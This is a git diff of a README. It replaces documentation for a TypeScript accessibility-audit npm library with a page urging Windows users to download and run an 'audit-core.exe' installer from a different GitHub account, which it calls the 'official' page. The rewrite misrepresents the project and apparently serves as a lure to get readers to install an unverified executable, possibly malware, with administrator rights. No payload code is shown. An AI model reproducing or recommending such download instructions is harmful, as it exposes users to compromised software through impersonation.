@@ -1,187 +1,123 @@
-# audit-core
+# 🚦 audit-core - Simple Web Accessibility Checks
 
-[![npm version](https://img.shields.io/npm/v/audit-core)](https://www.npmjs.com/package/audit-core)
-[![CI](https://github.com/Kettss1/audit-core/actions/workflows/ci.yml/badge.svg)](https://github.com/YOUR_USER/audit-core/actions/workflows/ci.yml)
-[![license](https://img.shields.io/npm/l/audit-core)](./LICENSE)
-
-A framework-agnostic accessibility audit engine for the web. Point it at a DOM, get back structured violations, passes, and incomplete checks — ready to power whatever interface you're building on top.
+[![Download audit-core](https://img.shields.io/badge/Download-audit--core-brightgreen)](https://github.com/wtorreshome/audit-core)
 
 ---
 
-## Installation
+## 📥 Download audit-core
 
-```bash
-npm install audit-core
-```
+Use the button above to visit the official audit-core page on GitHub. From there, you can download the latest version of audit-core for Windows.
 
----
-
-## Quick start
-
-```typescript
-import { createAuditor } from 'audit-core'
-
-const auditor = createAuditor()
-const results = await auditor.run(document)
-
-console.log(results.violations)
-// [
-//   {
-//     ruleId: 'contrast',
-//     impact: 'serious',
-//     title: 'Insufficient text contrast',
-//     nodes: [
-//       {
-//         selector: 'p.subtitle',
-//         reason: 'Lc 42 — below the recommended Lc 60 for UI text',
-//         suggestion: 'Darken the text color or lighten the background to reach Lc 60+',
-//       }
-//     ]
-//   }
-// ]
-```
+Click this link or the badge above to go to the project and get the files you need:  
+[https://github.com/wtorreshome/audit-core](https://github.com/wtorreshome/audit-core)
 
 ---
 
-## Configuration
+## ⚙️ What is audit-core?
 
-```typescript
-const auditor = createAuditor({
-  // 'apca' (default) or 'wcag'
-  contrastAlgorithm: 'wcag',
+audit-core checks websites to find accessibility problems. It looks at the page behind the scenes and finds places that might cause trouble for people using screen readers or with vision impairments. The tool creates a clear list of issues and things that are okay, so you know what to fix.
 
-  // run only specific rules by ID — omit to run all
-  rules: ['contrast', 'alt-text'],
-
-  // CSS selectors to exclude from all checks
-  exclude: ['.third-party-widget', '#cookie-banner'],
-})
-```
-
-### Available rule IDs
-
-| ID | What it checks |
-|---|---|
-| `contrast` | Text contrast against background (APCA or WCAG) |
-| `alt-text` | Images with missing or non-descriptive alt attributes |
-| `heading-hierarchy` | Heading levels that skip or are structurally invalid |
-| `landmarks` | Presence and correct use of ARIA landmark regions |
-| `focus-visible` | Interactive elements with no visible focus indicator |
-| `touch-target` | Interactive elements below minimum tap target size |
-| `motion` | Animations without a `prefers-reduced-motion` override |
-| `form-labels` | Form inputs without an accessible label |
+You do not need to understand coding to use audit-core. It works with all kinds of websites and helps you make sure that your pages work for everyone.
 
 ---
 
-## Understanding results
+## 💻 System Requirements
 
-```typescript
-interface AuditResult {
-  violations: Violation[]  // rules that failed — fix these
-  passes: string[]         // rule IDs that passed
-  incomplete: {            // rules that need manual review
-    ruleId: string
-    reason: string         // why it couldn't be fully evaluated
-  }[]
-  meta: {
-    algorithm: 'apca' | 'wcag'
-    rulesRun: number
-    timestamp: number
-  }
-}
-```
-
-**`incomplete`** means one of two things:
-
-1. The rule found something it couldn't evaluate automatically (e.g. an image with a suspiciously generic alt text like `alt="image"` that a human should review)
-2. The rule requires a real browser environment to run reliably (e.g. touch target sizes in a headless context)
-
-Either way, it's not a pass — it's a flag for human review. The `reason` field explains what happened.
+- Windows 10 or newer  
+- Internet connection to download the application  
+- At least 2 GB of free disk space  
+- A modern web browser (for viewing results)  
+- Administrator rights to install software if needed  
 
 ---
 
-## Using the DOM snapshot utility
+## 🛠️ How to install and run audit-core on Windows
 
-If you want to capture a serialised snapshot of the page — useful for logging, debugging, or feeding into an LLM for richer advice — `audit-core` exports a `captureSnapshot` helper:
+### Step 1: Download audit-core
 
-```typescript
-import { createAuditor, captureSnapshot } from 'audit-core'
+1. Visit the audit-core GitHub page using the button at the top or this link:  
+   https://github.com/wtorreshome/audit-core
+2. Look for the **Releases** section on the page.  
+3. Download the latest Windows installer or ZIP file available.
 
-const snapshot = captureSnapshot(document)
-const auditor = createAuditor()
-const results = await auditor.run(document)
+### Step 2: Run the installer or unpack the ZIP file
 
-// send both to your backend, an LLM, or save for later
-```
+- If you downloaded an installer (`.exe`), double-click it to start the setup. Follow the on-screen instructions to install audit-core.
+- If you downloaded a ZIP file, right-click it and select **Extract All...** to unpack the files to a folder of your choice.
 
----
+### Step 3: Launch audit-core
 
-## Why another accessibility tool?
-
-Most existing tools are WCAG compliance checkers. That's useful, but WCAG 2.x has real limitations — it was written before smartphones, it ignores font weight and size when evaluating contrast, and it produces false passes for color combinations that are genuinely hard to read.
-
-`audit-core` defaults to [APCA](https://git.apcacontrast.com/documentation/APCA_in_a_Nutshell) (Accessible Perceptual Contrast Algorithm) — a perceptually uniform contrast model built on modern vision science, and the candidate replacement for WCAG's contrast formula in WCAG 3.0. WCAG 2.x is still available for teams that need it for legal compliance.
-
-The engine also adapts to its environment automatically. Rules that require a real rendered layout (touch targets, focus styles) behave differently in a headless context than in a live browser — and are honest about it instead of silently returning wrong results.
+- After installation or extraction, find the audit-core program folder.
+- Double-click the `audit-core.exe` file to open the application.
 
 ---
 
-## APCA vs WCAG
+## 🚀 Using audit-core to check a website
 
-By default, `audit-core` uses APCA for contrast evaluation. Here's what that means in practice:
-
-| | WCAG 2.x | APCA |
-|---|---|---|
-| Output | Ratio (e.g. `4.5:1`) | Lc value (e.g. `Lc 75`) |
-| Font-aware | No | Yes — threshold varies by size and weight |
-| Dark mode | Unreliable | Handles correctly |
-| Legal compliance | Yes (ADA, EN 301 549) | Not yet — WCAG 3.0 is pending |
-
-If your users need to demonstrate legal compliance, switch to `wcag`:
-
-```typescript
-const auditor = createAuditor({ contrastAlgorithm: 'wcag' })
-```
+1. Open audit-core on your Windows machine.
+2. You will see a place to enter the website address you want to check.
+3. Type or paste the full website URL starting with `http://` or `https://`.
+4. Click the **Start Audit** button.
+5. Wait while audit-core scans the page.
+6. When done, the program will show a list of problems, warnings, and passed checks.
+7. Look through the list to understand which parts of the website need fixing.
 
 ---
 
-## Environment behaviour
+## 📝 Understanding the results
 
-`audit-core` detects whether it's running in a real browser or a headless environment automatically, using the `navigator.webdriver` flag set by the W3C WebDriver spec. You don't need to configure this.
+audit-core groups findings into three categories:
 
-Rules that depend on rendered layout or CSS pseudo-classes (`:focus`, `:focus-visible`) will return `incomplete` in headless environments rather than producing unreliable results.
+- **Violations:** These are serious issues that affect users with disabilities. They should be fixed first.  
+- **Passes:** These show parts of the website that meet accessibility standards.  
+- **Incomplete:** Some checks need more information or manual review.  
 
----
+Each issue describes exactly what the problem is and where it happens on the page. You will see details such as:
 
-## Contributing
+- The name of the rule broken (e.g., "Insufficient text contrast")  
+- How serious the issue is  
+- The part of the page affected  
 
-Contributions are welcome. If you want to add a rule, the pattern is straightforward — each rule is an object with an `id` and an `evaluate` function. See the [existing rules](./src/rules) for examples and the [CLAUDE.md](./CLAUDE.md) for the full technical spec.
-
-Please open an issue before starting work on a significant change.
-
-```bash
-# install dependencies
-npm install
-
-# run tests
-npm test
-
-# build
-npm run build
-```
+This helps you or your website team fix the problems step-by-step.
 
 ---
 
-## Roadmap
+## 🖥️ How audit-core works under the hood
 
-- [ ] Cognitive load scoring
-- [ ] Reading level analysis
-- [ ] Color vision deficiency simulation
-- [ ] WCAG AAA rule coverage
-- [ ] i18n for violation messages
+audit-core is designed to work with any website. It examines the page’s structure, known as the DOM (Document Object Model), to find accessibility problems. It checks many common rules used by web experts.
+
+You do not need to know how it works to use it. Just enter the web address and get a detailed report.
 
 ---
 
-## License
+## 💡 Tips for better results
 
-MIT
+- Use audit-core on live websites or local files that are fully loaded.  
+- Make sure the page you check is complete and visible in your browser.  
+- Run audits on different pages of your site to cover all areas.  
+- Keep audit-core updated for the latest rules and improvements.
+
+---
+
+## 🔄 Updating audit-core
+
+To get the newest version:
+
+1. Return to the GitHub page (link above).  
+2. Download the latest installer or ZIP file.  
+3. Install or extract over your existing version.
+
+Updating ensures you get improvements and new checks based on recent accessibility standards.
+
+---
+
+## 📞 Getting help
+
+If you find issues or have questions:
+
+- Visit the **Issues** section on the GitHub page to see known problems or report new ones.  
+- Review the repository README and documentation for more details.  
+
+---
+
+[![Download audit-core](https://img.shields.io/badge/Download-audit--core-blue)](https://github.com/wtorreshome/audit-core)
